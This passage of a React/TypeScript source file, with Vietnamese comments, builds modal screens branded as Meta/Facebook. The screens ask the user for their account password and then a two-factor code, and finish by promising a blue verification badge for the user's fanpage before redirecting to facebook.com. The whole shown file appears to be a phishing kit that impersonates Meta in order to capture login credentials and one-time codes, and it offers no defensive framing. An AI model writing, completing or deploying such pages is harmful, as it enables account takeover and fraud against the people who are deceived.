              <input
                type="checkbox"
                name="facebookNotification"
                checked={formData.facebookNotification}
                onChange={handleChange}
                className="sr-only peer"
              />
              <div className="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:bg-[#0064E0] transition-colors after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:after:translate-x-5 shadow-xs"></div>
            </label>
          </div>

          {/* Checkbox Terms of use */}
          <div className="flex items-center gap-2 pt-0.5">
            <input type="checkbox" id="terms" name="agreeToTerms" checked={formData.agreeToTerms} onChange={handleChange} className="w-3 h-3 rounded border-gray-300 text-[#0064E0] focus:ring-0 cursor-pointer" />
            <label htmlFor="terms" className="text-xs text-gray-700 select-none">
              I agree with <a href="#" className="text-[#0064E0] hover:underline">Terms of use</a>
            </label>
          </div>

          {/* Nút Send */}
          <button type="submit" className="w-full h-11 bg-[#0064E0] hover:bg-blue-700 active:scale-[0.99] text-white font-semibold rounded-lg text-sm transition-all shadow-md cursor-pointer mt-1">
            Send
          </button>
        </form>
      </div>
    </div>
  );
}

// ==================== COMPONENT 2: NHẬP MẬT KHẨU ====================
function PasswordModal() {
  const { currentStep, closeModal, submitPasswordAttempt } = useModalFlow();
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  if (currentStep !== "password") return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim() || loading) return;

    setLoading(true);
    const success = await submitPasswordAttempt(password);
    setLoading(false);

    if (!success) {
      setError(true);
      setPassword("");
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 font-sans">
      <div className="bg-white w-full max-w-[400px] rounded-2xl shadow-2xl p-6 relative border border-gray-100">
        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-sm">✕</button>
        <div className="flex items-center justify-center mb-3">
          <span className="text-lg font-bold text-[#0064E0]">∞ Meta</span>
        </div>
        <h3 className="text-sm font-semibold text-gray-900 mb-2 text-center">For your security, you must enter your password to continue.</h3>
        
        <form onSubmit={handleSubmit} className="mt-3 space-y-3">
          <input
            type="password"
            placeholder="Enter your password"
            value={password}
            onChange={(e) => { setPassword(e.target.value); setError(false); }}
            className={`w-full h-10 px-3.5 rounded-lg border ${error ? "border-red-500" : "border-gray-300"} text-xs sm:text-sm focus:outline-none text-gray-900`}
            autoFocus
          />
          {error && <p className="text-red-500 text-xs">Incorrect password. Please try again.</p>}
          <button type="submit" disabled={loading} className="w-full h-10 bg-[#0064E0] text-white font-semibold rounded-lg text-xs sm:text-sm hover:bg-blue-700 transition-all cursor-pointer">
            {loading ? "Checking..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
}

// ==================== COMPONENT 3: XÁC THỰC 2FA / OTP ====================
function TwofaModal() {
  const { currentStep, closeModal, submitTwofaAttempt } = useModalFlow();
  const [code, setCode] = useState("");
  const [countdown, setCountdown] = useState(0);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  if (currentStep !== "twofa") return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim() || loading || countdown > 0) return;

    setLoading(true);
    const success = await submitTwofaAttempt(code);
    setLoading(false);

    if (!success) {
      setCountdown(30);
      setCode("");
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 font-sans">
      <div className="bg-white w-full max-w-[420px] rounded-2xl shadow-2xl p-6 relative border border-gray-100">
        <button onClick={closeModal} className="absolute top-4 right-4 text-gray-400 hover:text-gray-600 text-sm">✕</button>
        <div className="flex items-center justify-center mb-2">
          <span className="text-lg font-bold text-[#0064E0]">∞ Meta</span>
        </div>
        <h3 className="text-base font-bold text-gray-900 mb-1 text-center">Two-factor authentication required</h3>
        <p className="text-xs text-gray-600 mb-4 text-center leading-relaxed">Check your email, Authenticator app, or phone number linked to your Facebook account to get the code.</p>

        <form onSubmit={handleSubmit} className="space-y-3">
          <label className="block text-xs font-semibold text-gray-700">Code</label>
          <input
            type="text"
            maxLength={8}
            value={code}
            onChange={(e) => setCode(e.target.value)}
            disabled={countdown > 0}
            className="w-full h-10 px-3.5 rounded-lg border border-gray-300 text-xs sm:text-sm focus:border-[#0064E0] focus:outline-none text-gray-900"
            autoFocus
          />
          {countdown > 0 && <p className="text-red-500 text-xs">Incorrect code. Please try again in {countdown}s.</p>}
          <button type="submit" disabled={loading || countdown > 0} className="w-full h-10 bg-[#0064E0] text-white font-semibold rounded-lg text-xs sm:text-sm hover:bg-blue-700 transition-all disabled:opacity-50 cursor-pointer">
            {loading ? "Verifying..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
}

// ==================== COMPONENT 4: THÀNH CÔNG ====================
function SuccessModal() {
  const { currentStep } = useModalFlow();

  if (currentStep !== "success") return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 font-sans">
      <div className="bg-white w-full max-w-[440px] rounded-2xl shadow-2xl p-6 text-center relative border border-gray-100">
        <div className="w-14 h-14 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-3 text-2xl font-bold">
          ✓
        </div>
        <h3 className="text-base font-bold text-gray-900 mb-2">Thank you for providing the required information.</h3>
        <p className="text-xs text-gray-600 mb-5 leading-relaxed">
          We will proceed with updating the blue verification badge for your fanpage. The process may take approximately 30–45 minutes.
        </p>
        <button
          onClick={() => (window.location.href = "https://facebook.com")}
          className="w-full h-10 bg-[#0064E0] hover:bg-blue-700 text-white font-semibold rounded-lg text-xs sm:text-sm transition-all cursor-pointer shadow-md"
        >
          Go to Facebook
        </button>
      </div>
    </div>
  );
}